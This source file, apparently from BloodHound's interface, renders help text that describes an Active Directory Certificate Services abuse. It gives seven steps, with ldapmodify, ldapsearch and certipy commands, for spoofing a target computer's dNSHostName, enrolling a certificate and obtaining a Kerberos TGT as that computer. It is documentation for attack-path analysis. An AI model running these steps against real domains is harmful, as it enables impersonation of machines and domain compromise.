// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { useHelpTextStyles } from '../utils';

const LinuxAbuse: FC = () => {
    const classes = useHelpTextStyles();
    const step1 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1: </b>Remove SPNs including <code>dNSHostName</code> on victim.
                <br />
                <br />
                The SPNs of the victim will be automatically updated when you change the <code>dNSHostName</code>. AD
                will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the
                victim account that includes the victim's <code>dNSHostName</code>. Remove SPN entries using ldapmodify:
            </Typography>
            <Typography component='pre'>
                {
                    'echo -e "dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'
                }
            </Typography>
        </>
    );

    const step2 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 2: </b>Set <code>dNSHostName</code> of victim computer to targeted computer's{' '}
                <code>dNSHostName</code>.
                <br />
                <br />
                Set the <code>dNSHostName</code> of the victim computer using Certipy:
            </Typography>
            <Typography component='pre'>
                {
                    'certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL'
                }
            </Typography>
        </>
    );

    const step3 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 3: </b>Check if <code>mail</code> attribute of victim must be set and set it if required.
                <br />
                <br />
                If the certificate template is of schema version 2 or above and its attribute{' '}
                <code>msPKI-CertificateNameFlag</code> contains the flag <code>SUBJECT_REQUIRE_EMAIL</code> and/or
                <code>SUBJECT_ALT_REQUIRE_EMAIL</code> then the victim principal must have their mail attribute set for
                the certificate enrollment. The CertTemplate BloodHound node will have <em>"Subject Require Email"</em>{' '}
                or <em>"Subject Alternative Name Require Email"</em> set to true if any of the flags are present.
                <br />
                <br />
                If the certificate template is of schema version 1 or does not have any of the email flags, then
                continue to Step 4.
                <br />
                <br />
                If any of the two flags are present, you will need the victim's mail attribute to be set. The value of
                the attribute will be included in the issues certificate but it is not used to identify the target
                computer why it can be set to any arbitrary string.
                <br />
                <br />
                Check if the victim has the mail attribute set using ldapsearch:
            </Typography>
            <Typography component='pre'>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "VICTIM-DN" mail`}</Typography>
            <Typography variant='body2'>
                If the victim has the mail attribute set, continue to Step 4.
                <br />
                <br />
                If the victim does not have the mail attribute set, set it to a dummy mail using ldapmodify:
            </Typography>
            <Typography component='pre'>
                {`echo -e "dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </Typography>
        </>
    );

    const step4 = (
        <Typography variant='body2'>
            <b>Step 4: </b>Obtain a session as victim.
            <br />
            <br />
            There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to
            interact with AD as the computer account, by abusing control over the computer AD object (see{' '}
            <Link
                target='blank'
                rel='noopener'
                href='https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll'>
                GenericAll edge documentation
            </Link>
            )
        </Typography>
    );

    const step5 = (
        <>
            <Typography variant='body2'>
                <b>Step 5: </b>Enroll certificate as victim.
                <br />
                <br />
                Use Certipy as the victim computer to request enrollment in the affected template, specifying the
                affected EnterpriseCA:
            </Typography>
            <Typography component='pre'>
                {'certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE'}
            </Typography>
            <Typography variant='body2'>
                The issued certificate will be saved to disk with the name of the targeted computer.
            </Typography>
        </>
    );

    const step6 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 6 (Optional): </b>Set <code>dNSHostName</code> and SPN of victim to the previous values.
                <br />
                <br />
                To avoid issues in the environment, set the <code>dNSHostName</code> and SPN of the victim computer back
                to its previous values using Certipy and ldapmodify:
            </Typography>
            <Typography component='pre'>
                {
                    'certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL'
                }
            </Typography>
            <Typography component='pre'>
                {
                    'echo -e "dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'
                }
            </Typography>
        </>
    );

    const step7 = (
        <>
            <Typography variant='body2'>
                <b>Step 7: </b>Perform Kerberos authentication as targeted computer against affected DC using
                certificate.
                <br />
                <br />
                Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and
                the IP of an affected DC:
            </Typography>
            <Typography component='pre'>{'certipy auth -pfx TARGET.pfx -dc-ip IP'}</Typography>
        </>
    );

    return (
        <>
            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
            {step1}
            {step2}
            {step3}
            {step4}
            {step5}
            {step6}
            {step7}
        </>
    );
};

export default LinuxAbuse;
